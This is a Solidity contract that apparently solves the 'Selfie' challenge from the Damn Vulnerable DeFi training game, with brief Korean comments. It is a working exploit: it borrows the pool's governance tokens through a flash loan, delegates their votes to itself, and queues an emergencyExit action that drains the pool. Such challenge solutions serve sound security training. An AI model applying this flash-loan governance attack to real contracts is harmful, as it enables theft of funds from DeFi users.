pragma solidity =0.8.25;
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";



//flashloan 수행
//queueAction 수행 (emergenceyExit)
//시간 지나고 executeAction 수행 
contract SelfieAttacker is IERC3156FlashBorrower{
    SelfiePool lendPool;
    DamnValuableVotes dvtToken;
    SimpleGovernance governance;
    address recovery;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
    uint256 actionId;


    constructor(address pool, address token, address gover, address _recovery){
        lendPool = SelfiePool(pool);
        dvtToken = DamnValuableVotes(token);
        governance = SimpleGovernance(gover);
        recovery = _recovery;
    }
   
    function getActionId() external returns (uint256){
        return actionId;
    }

    function attack() external {
        //function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        // function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        // function emergencyExit(address receiver) external onlyGovernance {
        lendPool.flashLoan(this, address(dvtToken), TOKENS_IN_POOL,"");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        
        DamnValuableVotes(token).delegate(address(this));
        bytes memory callData = abi.encodeCall(lendPool.emergencyExit,(recovery));
        actionId = governance.queueAction(address(lendPool), 0, callData);
        
        DamnValuableVotes(token).approve(address(lendPool),TOKENS_IN_POOL);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}